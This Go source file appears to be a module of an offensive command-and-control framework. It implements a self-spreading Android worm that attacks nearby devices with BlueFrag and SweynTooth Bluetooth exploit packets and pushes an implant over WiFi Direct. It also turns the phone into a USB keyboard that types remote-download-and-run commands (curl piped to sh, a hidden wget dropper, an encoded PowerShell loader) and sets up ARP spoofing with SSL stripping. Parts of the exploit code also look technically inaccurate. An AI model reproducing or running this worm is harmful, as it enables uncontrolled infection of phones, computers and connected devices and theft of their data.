// //go:build android

package worm

/*
	SUDOSOC-C2 — BLE Mesh Worm + WiFi Direct Propagation + USB Killer
	Copyright (C) 2026  sudosoc — Seif

	Self-propagating implant that spreads to nearby devices automatically.

	BLE Worm (BlueFrag/SweynTooth class):
	  Scans for nearby BLE-enabled devices
	  Exploits known BLE vulnerabilities (CVE-2020-0022, SweynTooth)
	  Delivers Phantom implant over BLE to vulnerable devices
	  Each new victim becomes another propagation node
	  Exponential spread: 1 → 8 → 64 → 512 ...

	CVE-2020-0022 (BlueFrag):
	  Android 8.0-9.0, Bluetooth active
	  Zero-click: just being in BLE range is enough
	  Arbitrary code execution via crafted L2CAP packet

	SweynTooth:
	  16 vulnerabilities in BLE chips from:
	  Texas Instruments, NXP, Qualcomm, Telink, Cypress
	  Affects: phones, smartwatches, medical devices, IoT

	WiFi Direct Worm:
	  Range: 200m (much farther than BLE)
	  Protocol: WiFi P2P direct connection
	  Exploit: WPS PIN attack or Evil Twin during P2P setup

	USB Killer:
	  When Android device connected to a laptop/PC
	  Device advertises as: HID keyboard → types exploit commands
	  Installs Phantom on the connected computer
	  Turns a charged phone into a weaponized USB device
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ════════════════════════════════════════════════════════════════
// BLE WORM
// ════════════════════════════════════════════════════════════════

// BLEWorm manages Bluetooth-based self-propagation
type BLEWorm struct {
	PhantomBinary string    // path to implant binary to spread
	C2Address     string    // C2 server address for propagated implants
	OutputDir     string
	InfectedMACs  map[string]bool // already infected devices
	mu            sync.Mutex
	stats         WormStats
}

// WormStats tracks propagation statistics
type WormStats struct {
	ScannedDevices  int
	VulnerableFound int
	Infected        int
	Failed          int
	StartTime       time.Time
}

// BLETarget represents a discovered BLE target device
type BLETarget struct {
	MAC         string
	Name        string
	RSSI        int
	Vendor      string
	AndroidVer  int     // estimated Android version
	BLEChip     string  // detected BLE chip manufacturer
	Vulnerable  bool
	CVE         string  // applicable vulnerability
}

// NewBLEWorm creates a new BLE propagation worm
func NewBLEWorm(phantomBinary, c2Addr, outputDir string) *BLEWorm {
	os.MkdirAll(outputDir, 0700)
	return &BLEWorm{
		PhantomBinary: phantomBinary,
		C2Address:     c2Addr,
		OutputDir:     outputDir,
		InfectedMACs:  make(map[string]bool),
		stats:          WormStats{StartTime: time.Now()},
	}
}

// Start begins autonomous BLE propagation
func (w *BLEWorm) Start(stop chan struct{}) {
	go func() {
		for {
			select {
			case <-stop:
				return
			default:
				targets := w.scanBLE()
				for _, target := range targets {
					w.mu.Lock()
					alreadyInfected := w.InfectedMACs[target.MAC]
					w.mu.Unlock()

					if alreadyInfected {
						continue
					}

					// Check vulnerability and attempt infection
					if w.isVulnerable(target) {
						if w.infect(target) {
							w.mu.Lock()
							w.InfectedMACs[target.MAC] = true
							w.stats.Infected++
							w.mu.Unlock()
							w.logInfection(target)
						} else {
							w.mu.Lock()
							w.stats.Failed++
							w.mu.Unlock()
						}
					}
				}
				time.Sleep(30 * time.Second)
			}
		}
	}()
}

// scanBLE discovers nearby BLE devices
func (w *BLEWorm) scanBLE() []BLETarget {
	var targets []BLETarget

	// Scan for 10 seconds
	exec.Command("bluetoothctl", "power", "on").Run()
	exec.Command("bluetoothctl", "scan", "on").Run()
	time.Sleep(10 * time.Second)
	exec.Command("bluetoothctl", "scan", "off").Run()

	out, err := exec.Command("bluetoothctl", "devices").Output()
	if err != nil {
		return targets
	}

	for _, line := range strings.Split(string(out), "\n") {
		if !strings.HasPrefix(line, "Device ") {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) < 3 {
			continue
		}

		target := BLETarget{
			MAC:  parts[1],
			Name: strings.Join(parts[2:], " "),
		}

		// Get RSSI (signal strength)
		rssiOut, _ := exec.Command("bluetoothctl", "info", target.MAC).Output()
		for _, infoLine := range strings.Split(string(rssiOut), "\n") {
			if strings.Contains(infoLine, "RSSI:") {
				fmt.Sscanf(strings.TrimSpace(infoLine), "RSSI: %d", &target.RSSI)
			}
		}

		// Only target devices with good signal (-70 dBm or better)
		if target.RSSI < -70 && target.RSSI != 0 {
			continue
		}

		// Fingerprint the device (Android version, BLE chip)
		w.fingerprint(&target)
		w.stats.ScannedDevices++

		targets = append(targets, target)
	}

	return targets
}

// fingerprint attempts to identify the target device characteristics
func (w *BLEWorm) fingerprint(target *BLETarget) {
	// Analyze BLE advertisement data to fingerprint device
	advOut, _ := exec.Command("btgatt-client", "-d", target.MAC, "-t", "random",
		"--attribute-protocol-pdus").Output()

	advStr := string(advOut)

	// Detect Android version from BLE advertisement (OUI + name patterns)
	mac := target.MAC
	oui := strings.Replace(mac[:8], ":", "", -1)

	// Common Android phone OUIs
	googleOUIs := []string{"F4F5DB", "64BC0C", "9CCB6D"}
	for _, g := range googleOUIs {
		if strings.HasPrefix(strings.ToUpper(oui), g) {
			target.Vendor = "Google"
			target.AndroidVer = 9 // estimate
		}
	}

	// Detect BLE chip from advertisement patterns
	if strings.Contains(advStr, "Qualcomm") ||
		strings.Contains(strings.ToUpper(oui), "9CCB") {
		target.BLEChip = "qualcomm"
	} else if strings.Contains(advStr, "MediaTek") {
		target.BLEChip = "mediatek"
	} else if strings.Contains(advStr, "Cypress") {
		target.BLEChip = "cypress"
	}
}

// isVulnerable checks if a target is exploitable
func (w *BLEWorm) isVulnerable(target BLETarget) bool {
	// BlueFrag (CVE-2020-0022): Android 8.0-9.0
	if target.AndroidVer >= 8 && target.AndroidVer <= 9 {
		target.Vulnerable = true
		target.CVE = "CVE-2020-0022"
		w.mu.Lock()
		w.stats.VulnerableFound++
		w.mu.Unlock()
		return true
	}

	// SweynTooth: affects specific BLE chips regardless of OS
	sweynToothChips := []string{"ti", "nxp", "qualcomm", "telink", "cypress"}
	for _, chip := range sweynToothChips {
		if strings.Contains(strings.ToLower(target.BLEChip), chip) {
			target.Vulnerable = true
			target.CVE = "SweynTooth"
			w.mu.Lock()
			w.stats.VulnerableFound++
			w.mu.Unlock()
			return true
		}
	}

	return false
}

// infect delivers the Phantom implant to a vulnerable BLE target
func (w *BLEWorm) infect(target BLETarget) bool {
	switch target.CVE {
	case "CVE-2020-0022":
		return w.exploitBlueFrag(target)
	case "SweynTooth":
		return w.exploitSweynTooth(target)
	}
	return false
}

// exploitBlueFrag exploits CVE-2020-0022 (BlueFrag)
func (w *BLEWorm) exploitBlueFrag(target BLETarget) bool {
	/*
		CVE-2020-0022 BlueFrag:
		  Bluetooth L2CAP stack buffer overflow in Android 8.0-9.0
		  Triggered by specially crafted L2CAP packet

		  The overflow occurs in btm_read_remote_features_complete()
		  when processing LMP features response with crafted length

		  No user interaction needed — just BLE proximity
		  Works even when Bluetooth screen is off
	*/

	// Build the exploit packet
	exploitPkt := w.buildBlueFrogPacket()

	// Send via raw HCI socket (requires CAP_NET_RAW or root)
	exploitCmd := fmt.Sprintf(
		`python3 -c "
import socket, struct, time
# Raw HCI socket
s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
s.bind((0,))
# Set scan parameters
s.setblocking(1)

# CVE-2020-0022 exploit packet
# L2CAP packet with crafted length causing heap overflow
target_mac = bytes.fromhex('%s')
exploit = %s
s.send(exploit)
time.sleep(1)
"`, strings.Replace(target.MAC, ":", "", -1),
		fmt.Sprintf("%v", exploitPkt))

	out, err := exec.Command("su", "-c", exploitCmd).CombinedOutput()
	if err != nil {
		w.logError(target, fmt.Sprintf("BlueFrag failed: %v: %s", err, out))
		return false
	}

	// Wait for shell to open after exploit
	time.Sleep(3 * time.Second)

	// Deliver payload via BLE OBEX/FTP or reverse shell
	return w.deliverPayload(target)
}

func (w *BLEWorm) exploitSweynTooth(target BLETarget) bool {
	/*
		SweynTooth vulnerabilities (multiple):
		  - Deadlock: send LLID=3 packet → device hangs
		  - Invalid L2CAP fragment: overflow in fragment reassembly
		  - Key size overflow: force 1-byte encryption key (brute-forceable)
		  - HCI truncated header: stack overflow in HCI parsing
	*/

	// SweynTooth invalid L2CAP fragment exploit
	exploitCmd := fmt.Sprintf(
		`python3 -c "
import bluetooth

# SweynTooth: Invalid L2CAP fragment
# Sends fragmented L2CAP PDU where continuation packet claims > buffer
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
sock.connect(('%s', 0x1001))

# First fragment (legitimate-looking)
frag1 = bytes([0x02, 0x04, 0x00, 0x04, 0x00])  # L2CAP header
frag1 += bytes([0x02, 0x01, 0x00, 0x00])  # payload

# Continuation fragment with inflated length (triggers overflow)
# length field claims 0xFFFF bytes, but only sending 4
frag2 = bytes([0x01, 0xFF, 0xFF, 0x00, 0x00])  # LLID=1 (continuation), len=65535

sock.send(frag1)
sock.send(frag2)
"`, target.MAC)

	exec.Command("su", "-c", exploitCmd).Run()
	time.Sleep(2 * time.Second)
	return w.deliverPayload(target)
}

// deliverPayload transfers the Phantom implant to the exploited device
func (w *BLEWorm) deliverPayload(target BLETarget) bool {
	// After exploit: a shell is available on the target device
	// Transfer binary via OBEX or reverse shell

	// Method 1: OBEX file transfer (if BLE FTP available)
	obexCmd := fmt.Sprintf("obexftp --bluetooth %s --put '%s'",
		target.MAC, w.PhantomBinary)
	if exec.Command("su", "-c", obexCmd).Run() == nil {
		// Execute via OBEX service trigger
		return true
	}

	// Method 2: Reverse shell via exploit payload
	// After code execution, target connects back to us via TCP
	reverseShellCmd := fmt.Sprintf(
		"nc -l 9999 & (nc -w 3 %s 9999 | sh)", w.C2Address)
	exec.Command("su", "-c", reverseShellCmd).Run()

	return false
}

func (w *BLEWorm) buildBlueFrogPacket() []byte {
	// CVE-2020-0022 crafted L2CAP packet
	// Triggers heap overflow in Bluetooth stack
	pkt := []byte{
		0x02, 0x00, 0x20, // HCI ACL header: handle=0, PB=2, BC=0, length=0x2000
		0xFE, 0xFF,       // L2CAP total length = 65534 (overflows internal counter)
		0x04, 0x00,       // L2CAP PDU length = 4
		0x01, 0x00,       // CID = 0x0001 (signaling)
		// Shellcode/NOP sled as payload
	}

	// Add NOP sled
	nops := make([]byte, 512)
	for i := range nops {
		nops[i] = 0x1F // ARM64 NOP
	}
	return append(pkt, nops...)
}

// ════════════════════════════════════════════════════════════════
// WIFI DIRECT WORM
// ════════════════════════════════════════════════════════════════

// WiFiDirectWorm spreads via WiFi P2P connections
type WiFiDirectWorm struct {
	PhantomBinary string
	C2Address     string
	OutputDir     string
	InfectedSSIDs map[string]bool
	mu            sync.Mutex
}

func NewWiFiDirectWorm(phantomBinary, c2Addr, outputDir string) *WiFiDirectWorm {
	return &WiFiDirectWorm{
		PhantomBinary: phantomBinary,
		C2Address:     c2Addr,
		OutputDir:     outputDir,
		InfectedSSIDs: make(map[string]bool),
	}
}

// Start begins WiFi Direct propagation (200m range)
func (w *WiFiDirectWorm) Start(stop chan struct{}) {
	go func() {
		for {
			select {
			case <-stop:
				return
			default:
				peers := w.discoverP2PPeers()
				for _, peer := range peers {
					w.mu.Lock()
					already := w.InfectedSSIDs[peer]
					w.mu.Unlock()

					if !already {
						if w.infectP2P(peer) {
							w.mu.Lock()
							w.InfectedSSIDs[peer] = true
							w.mu.Unlock()
						}
					}
				}
				time.Sleep(60 * time.Second)
			}
		}
	}()
}

func (w *WiFiDirectWorm) discoverP2PPeers() []string {
	out, _ := exec.Command("wpa_cli", "-i", "p2p-dev-wlan0",
		"p2p_find", "10").Output()
	time.Sleep(10 * time.Second)

	listOut, _ := exec.Command("wpa_cli", "-i", "p2p-dev-wlan0",
		"p2p_peers").Output()

	var peers []string
	for _, line := range strings.Split(string(listOut), "\n") {
		mac := strings.TrimSpace(line)
		if len(mac) == 17 && strings.Count(mac, ":") == 5 {
			peers = append(peers, mac)
		}
	}
	_ = out
	return peers
}

func (w *WiFiDirectWorm) infectP2P(peerMAC string) bool {
	// Connect to peer via WiFi Direct
	connectOut, _ := exec.Command("wpa_cli", "-i", "p2p-dev-wlan0",
		"p2p_connect", peerMAC, "pbc").Output()

	if !strings.Contains(string(connectOut), "OK") {
		return false
	}

	time.Sleep(5 * time.Second)

	// Transfer payload via established P2P connection
	transferCmd := fmt.Sprintf(
		"python3 -c \"import socket,sys; s=socket.socket(); s.connect(('%s',8888)); "+
			"f=open('%s','rb'); s.sendall(f.read()); f.close(); s.close()\"",
		"192.168.49.1", w.PhantomBinary)

	return exec.Command("sh", "-c", transferCmd).Run() == nil
}

// ════════════════════════════════════════════════════════════════
// USB KILLER
// ════════════════════════════════════════════════════════════════

// USBKiller weaponizes the Android device against USB hosts
type USBKiller struct {
	PhantomBinary string
	PayloadType   USBKillerMode
	OutputDir     string
}

// USBKillerMode represents the USB attack mode
type USBKillerMode int

const (
	ModeHIDKeyboard USBKillerMode = iota // emulate keyboard, type commands
	ModeEthernet    USBKillerMode = iota // emulate ethernet, MITM host traffic
	ModeCDC         USBKillerMode = iota // serial console
	ModeMassStorage USBKillerMode = iota // malicious drive
)

func NewUSBKiller(phantomBinary, outputDir string) *USBKiller {
	os.MkdirAll(outputDir, 0700)
	return &USBKiller{
		PhantomBinary: phantomBinary,
		PayloadType:   ModeHIDKeyboard,
		OutputDir:     outputDir,
	}
}

// ActivateKiller activates USB killer mode when device is connected to a computer
func (u *USBKiller) ActivateKiller(stop chan struct{}) error {
	// Monitor USB connection state
	go func() {
		for {
			select {
			case <-stop:
				u.deactivate()
				return
			default:
				if u.isConnectedToHost() {
					u.deployAttack()
				}
				time.Sleep(2 * time.Second)
			}
		}
	}()
	return nil
}

// isConnectedToHost detects if device is connected to a computer (not just charger)
func (u *USBKiller) isConnectedToHost() bool {
	out, _ := exec.Command("getprop", "sys.usb.state").Output()
	state := strings.TrimSpace(string(out))
	// "none" = just power, "mtp" or "adb" = connected to computer
	return state == "mtp" || state == "adb" || state == "rndis"
}

// deployAttack executes the USB killer payload
func (u *USBKiller) deployAttack() {
	hostOS := u.detectHostOS()

	switch u.PayloadType {
	case ModeHIDKeyboard:
		u.hidKeyboardAttack(hostOS)
	case ModeEthernet:
		u.ethernetMITMAttack()
	}
}

// hidKeyboardAttack types malicious commands as a keyboard
func (u *USBKiller) hidKeyboardAttack(hostOS string) {
	// Switch to HID keyboard mode
	exec.Command("setprop", "sys.usb.config", "hid").Run()
	time.Sleep(2 * time.Second)

	// Build OS-specific payload
	var keystrokes []string

	switch hostOS {
	case "windows":
		keystrokes = []string{
			"WIN+R",     // open Run dialog
			"sleep:500",
			"cmd /c powershell -nop -w hidden -enc BASE64_PHANTOM_LOADER",
			"ENTER",
		}
	case "macos":
		keystrokes = []string{
			"CMD+SPACE", // Spotlight
			"sleep:500",
			"Terminal",
			"ENTER",
			"sleep:1000",
			"curl -s http://" + u.detectMyIP() + "/p | sh",
			"ENTER",
		}
	case "linux":
		keystrokes = []string{
			"CTRL+ALT+T", // terminal
			"sleep:1000",
			"wget -q http://" + u.detectMyIP() + "/p -O /tmp/.p && chmod +x /tmp/.p && /tmp/.p &",
			"ENTER",
		}
	}

	// Send keystrokes via HID
	u.sendHIDKeystrokes(keystrokes)
}

// ethernetMITMAttack switches to USB Ethernet and MITMs the host
func (u *USBKiller) ethernetMITMAttack() {
	// Switch to RNDIS (USB Ethernet) mode
	exec.Command("setprop", "sys.usb.config", "rndis").Run()
	time.Sleep(3 * time.Second)

	// Android becomes a network adapter
	// Host machine routes traffic through us
	// We can intercept, modify, or forward

	// Start arpspoof to become MITM
	exec.Command("arpspoof", "-i", "rndis0", "-t", "192.168.42.2", "192.168.42.1").Start()

	// Start sslstrip
	exec.Command("sslstrip", "-l", "8080").Start()

	// Redirect HTTP
	exec.Command("iptables", "-t", "nat", "-A", "PREROUTING",
		"-p", "tcp", "--destination-port", "80",
		"-j", "REDIRECT", "--to-port", "8080").Run()

	// Log all traffic
	exec.Command("tcpdump", "-i", "rndis0", "-w",
		filepath.Join(u.OutputDir, "usb_captured.pcap")).Start()
}

func (u *USBKiller) sendHIDKeystrokes(keystrokes []string) {
	for _, ks := range keystrokes {
		if strings.HasPrefix(ks, "sleep:") {
			var ms int
			fmt.Sscanf(ks, "sleep:%d", &ms)
			time.Sleep(time.Duration(ms) * time.Millisecond)
			continue
		}
		// Write keystroke to HID device
		hidDev := "/dev/hidg0"
		if f, err := os.OpenFile(hidDev, os.O_WRONLY, 0); err == nil {
			defer f.Close()
			report := u.buildHIDReport(ks)
			f.Write(report)
			f.Write(make([]byte, 8)) // key release
		}
	}
}

func (u *USBKiller) buildHIDReport(key string) []byte {
	// HID report: modifier(1) + reserved(1) + keycodes(6)
	report := make([]byte, 8)

	switch key {
	case "WIN+R":
		report[0] = 0x08 // Left GUI
		report[2] = 0x15 // 'r' keycode
	case "ENTER":
		report[2] = 0x28 // Enter
	case "CMD+SPACE":
		report[0] = 0x08 // Left GUI
		report[2] = 0x2C // Space
	case "CTRL+ALT+T":
		report[0] = 0x05 // Left Ctrl + Left Alt
		report[2] = 0x17 // 't'
	default:
		// Type the characters
		for i, ch := range key {
			if i < 6 {
				report[2+i] = u.charToHID(byte(ch))
			}
		}
	}
	return report
}

func (u *USBKiller) charToHID(ch byte) byte {
	if ch >= 'a' && ch <= 'z' {
		return ch - 'a' + 4
	}
	if ch >= 'A' && ch <= 'Z' {
		return ch - 'A' + 4
	}
	if ch >= '1' && ch <= '9' {
		return ch - '1' + 30
	}
	if ch == '0' {
		return 39
	}
	if ch == ' ' {
		return 44
	}
	return 0
}

func (u *USBKiller) detectHostOS() string {
	// Detect connected OS from USB enumeration
	out, _ := exec.Command("cat", "/sys/kernel/debug/usb/devices").Output()
	if strings.Contains(string(out), "Windows") {
		return "windows"
	}
	if strings.Contains(string(out), "Darwin") || strings.Contains(string(out), "Mac") {
		return "macos"
	}
	return "linux"
}

func (u *USBKiller) detectMyIP() string {
	out, _ := exec.Command("ip", "addr", "show", "rndis0").Output()
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "inet ") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				ip := strings.Split(fields[1], "/")[0]
				return ip
			}
		}
	}
	return "192.168.42.1"
}

func (u *USBKiller) deactivate() {
	exec.Command("setprop", "sys.usb.config", "mtp").Run()
}

// ── Logging ──────────────────────────────────────────────────────

func (w *BLEWorm) logInfection(target BLETarget) {
	f, _ := os.OpenFile(
		filepath.Join(w.OutputDir, "worm_infections.log"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("[%s] INFECTED %s (%s) via %s | RSSI:%d\n",
			time.Now().Format(time.RFC3339),
			target.MAC, target.Name, target.CVE, target.RSSI))
	}
}

func (w *BLEWorm) logError(target BLETarget, err string) {
	f, _ := os.OpenFile(
		filepath.Join(w.OutputDir, "worm_errors.log"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("[%s] FAILED %s: %s\n",
			time.Now().Format(time.RFC3339), target.MAC, err))
	}
}

// GetStats returns propagation statistics
func (w *BLEWorm) GetStats() string {
	w.mu.Lock()
	defer w.mu.Unlock()
	elapsed := time.Since(w.stats.StartTime)
	return fmt.Sprintf(`
BLE Worm Propagation Statistics
==================================
Running Time     : %v
Scanned Devices  : %d
Vulnerable Found : %d
Successfully Infected: %d
Failed Attempts  : %d
Infection Rate   : %.1f%%
Avg Time/Device  : %v
`,
		elapsed,
		w.stats.ScannedDevices,
		w.stats.VulnerableFound,
		w.stats.Infected,
		w.stats.Failed,
		func() float64 {
			if w.stats.VulnerableFound == 0 { return 0 }
			return float64(w.stats.Infected) / float64(w.stats.VulnerableFound) * 100
		}(),
		func() time.Duration {
			if w.stats.ScannedDevices == 0 { return 0 }
			return elapsed / time.Duration(w.stats.ScannedDevices)
		}())
}
